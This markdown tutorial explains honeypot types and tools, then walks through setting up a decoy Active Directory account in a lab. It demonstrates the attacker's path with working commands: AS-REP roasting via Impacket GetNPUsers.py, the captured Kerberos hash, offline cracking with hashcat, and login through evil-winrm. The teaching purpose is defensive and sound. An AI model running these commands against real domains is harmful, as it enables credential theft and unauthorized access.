# Honey Pot

### What is honey pot?

The honey pot is like a trap that's used for detecting if there's an attacker in our network.
It's also helping to understand the attacker's behaviour, so you can know his technique

### honey pot examples

1. **Low-Interaction Honeypots**
These simulate basic services and are easier to deploy and maintain. They are primarily used for early detection of attacks and gathering information about automated threats.

`Honeyd`: A small daemon that creates virtual hosts on a network.
`Kippo`: An SSH honeypot designed to log brute force attacks and the entire shell interaction performed by the attacker.

2. **High-Interaction Honeypots**
These provide a real operating system and services to the attacker, allowing more detailed monitoring of their actions. They are more complex and riskier to manage.

`Dionaea`: Designed to trap malware exploiting vulnerabilities in services.
`Cuckoo Sandbox`: An automated malware analysis system.

3. **Research Honeypots**
These are used by researchers to study and understand the behavior, techniques, and motivations of attackers. They are typically high-interaction honeypots.

`Honeynet Project`: An open-source project that provides tools and resources for deploying and analyzing honeypots and honeynets.

4. **Production Honeypots**
These are deployed within an organization’s network to detect and deflect attacks in real time. They can be either low or high interaction.

`Symantec Deception`: An enterprise solution that uses decoys and lures to detect threats.
`Illusive Networks`: Creates an entire deceptive layer within the network to mislead attackers.

5. **Pure Honeypots**
These are actual systems with no production value other than being used for monitoring and logging the activities of an attacker.

6. **Hybrid Honeypots**
These combine elements of both low and high interaction honeypots to balance between detail and ease of management.

#### Practical Implementations:
`Honeytokens`: These are not actual systems but pieces of data that look like legitimate credentials or files to attract and trap attackers. For example, fake API keys or database credentials.
`T-Pot`: A multi-honeypot platform that integrates several honeypots, visualization, and monitoring tools.
Each type of honeypot serves a different purpose and offers various levels of interaction and complexity to balance the trade-offs between monitoring capabilities and operational risk.

### Honey Pot in our environment
As we have an active directory environment with many users we can create a user account as a trap and it will be our honey pot

Steps:

- Creating the honey pot user account (we will name it ahmed as example)
<img src="/Assets/imgs/create_ahmed.png">

- Add ahmed to `Remote Management Users` group
<img src="/Assets/imgs/add_to_group.png">
This group contains the user accounts that can be accessed using remote management service or tools like `evil-winrm`.
This will make the access of the account for the attacker is easier.

- You can make the account more vulnerable (easier to be attacked than other domain accounts), but don't make it so obvious (The Hacker isn't silly). You can choose the way depending on your point of view, in our example we will make it simple (for learning purpose) and we will remove the `kerberos preauth` for this account, so the attacker can acquire the TGT of the account using `As-repRoasting attack`.
<img src="/Assets/imgs/remove_preauthentication_ahmed.png">
Note: The attacker can get the TGT using this attack or through packet sniffing if he got access to the traffic.
The attacker then can crack the TGT and get the password of the user.
```bash
┌──(youssif㉿youssif)-[/usr/share/doc/python3-impacket/examples]
└─$ ./GetNPUsers.py rift.local/ -usersfile ~/Desktop/users.txt -dc-ip 192.168.2.129
Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$ahmed@RIFT.LOCAL:46179071d83bb8c30f60d9fa9e4f5afb$3f52857d2b2e1d5ede62c12817a941f205c33a3d7dbc268ec749c7ae021ecd587d32f67f961794332bbc5ec51f76a6aa77cde907bfbe61c3254bf99b905d1b07b9813b80bf798695df24e781a593afaf919a721e1da5096dc29f955d62b47e6941663b77cb049ecac3b2d2762d7bb4d8ea6ff0e8f8a01d8d70aa045c4db0d4a5c45fe76df9dea25a36fd90eb87c88346b0ba0609235869f8a3f0a05f82e30ff182550d728924f88fb5846e6cd7de909b75d25cf0d58ec7361d0924907b377591184c8cecbf2e7677569425f78ff2786f1e9b47fde50f4901522b4b89c170d9a5f99641a302bd15ca
                                                                                                   
┌──(youssif㉿youssif)-[/usr/share/doc/python3-impacket/examples]
└─$ echo '$krb5asrep$23$ahmed@RIFT.LOCAL:46179071d83bb8c30f60d9fa9e4f5afb$3f52857d2b2e1d5ede62c12817a941f205c33a3d7dbc268ec749c7ae021ecd587d32f67f961794332bbc5ec51f76a6aa77cde907bfbe61c3254bf99b905d1b07b9813b80bf798695df24e781a593afaf919a721e1da5096dc29f955d62b47e6941663b77cb049ecac3b2d2762d7bb4d8ea6ff0e8f8a01d8d70aa045c4db0d4a5c45fe76df9dea25a36fd90eb87c88346b0ba0609235869f8a3f0a05f82e30ff182550d728924f88fb5846e6cd7de909b75d25cf0d58ec7361d0924907b377591184c8cecbf2e7677569425f78ff2786f1e9b47fde50f4901522b4b89c170d9a5f99641a302bd15ca' > ~/Desktop/hash.txt
```
Then the attacker can try cracking the password offline
```bash
┌──(youssif㉿youssif)-[/usr/share/doc/python3-impacket/examples]
└─$ hashcat -m 18200 -a 0 ~/Desktop/hash.txt /usr/share/wordlists/rockyou.txt -O
```
and he got the password `ahmed123`

- The attacker can use this credential to login using `evil-winrm`
<img src="/Assets/imgs/evil-winrm.png">

- congratz, now the hacker fell in out honey pot